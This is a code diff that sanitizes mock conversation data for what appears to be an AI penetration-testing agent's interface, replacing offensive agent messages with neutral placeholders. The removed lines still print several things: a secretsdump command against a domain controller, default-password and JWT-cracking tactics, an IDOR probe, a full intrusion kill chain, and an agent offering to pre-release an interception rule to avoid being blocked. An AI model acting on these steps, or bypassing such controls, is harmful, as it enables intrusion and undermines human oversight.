       ts: T("2026-09-30T00:11:11Z"),
       tool: "bash",
       action: "allow",
-      command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc # Approved and released",
+      command: "Recorded observation. This preview did not run it.",
     },
   ],
 };
@@ -3900,7 +3902,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-09-29T17:28:20Z"),
       kind: "text",
       summary:
-        "Conclusion: Element-UI backend, no verification code, no rate limit. Entry sequence: ① First run the default password table (admin/admin, admin/admin123, admin/123456) ② If it fails, then go to the top1000 dictionary. I have injected \"background default password test\" into the work agent as a high-quality intent.",
+        "Recorded observation. This preview did not run it.",
     },
     { seq: 8, worker: "user", ts: T("2026-09-30T01:53:09Z"), kind: "user", summary: "Is it done?" },
     {
@@ -3909,7 +3911,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-09-30T01:53:11Z"),
       kind: "text",
       summary:
-        "It's done - admin/admin123 logs into the console directly, which has been recorded as a high-risk discovery and proves that the goal of \"obtaining background management permissions\" has been achieved. The next step turns to reading user data (goal ②).",
+        "Recorded observation. This preview did not run it.",
     },
   ],
   2: [
@@ -3971,7 +3973,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-09-29T08:54:00Z"),
       kind: "text",
       summary:
-        "There are two ways to exceed authority: ① /v1/orders?id= is a self-increasing numeric id → typical IDOR, change the id to try reading other people's orders; ② Use HS256 for JWT, try john/hashcat to explode the key → you can forge any sub to exceed authority. I derived each of these two items into an intention. It is recommended to do IDOR first (low cost, direct impact).",
+        "Recorded observation. This preview did not run it.",
     },
   ],
   3: [
@@ -3980,7 +3982,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-09-29T20:12:28Z"),
       kind: "user",
-      summary: "Now that I have the shell, how do I access the intranet next?",
+      summary: "The DMZ host is recorded. What should we verify next?",
     },
     {
       seq: 2,
@@ -4044,7 +4046,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-09-29T23:51:43Z"),
       kind: "text",
       summary:
-        "Yes. svc_deploy + Domain Admins = psexec can fetch DC01 directly. After getting it, do secretsdump to import the global hash and finish. Note that secretsdump will trigger the interception rule, I will help you release it in advance.",
+        "Recorded observation. This preview did not run it.",
     },
     { seq: 10, worker: "user", ts: T("2026-09-30T00:18:48Z"), kind: "user", summary: "The target is captured, let's summarize the attack chain." },
     {
@@ -4053,7 +4055,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-09-30T00:18:54Z"),
       kind: "text",
       summary:
-        "Complete kill chain:\n1. .git leak → source code white box + hard-coded credentials\n2. shop Fastjson RCE→DMZ rebound shell\n3. sudo privileges →root\n4. Intranet discovery→DC01/FS01/Jenkins\n5. Jenkins is not authorized → export domain credentials svc_deploy\n6. Kerberoasting→Crack svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump global hash\n\nAll four goals were achieved, with 17 discoveries (7 high/4 medium/2 low + 8 intranet links).",
+        "Recorded observation. This preview did not run it.",
     },
   ],
 };
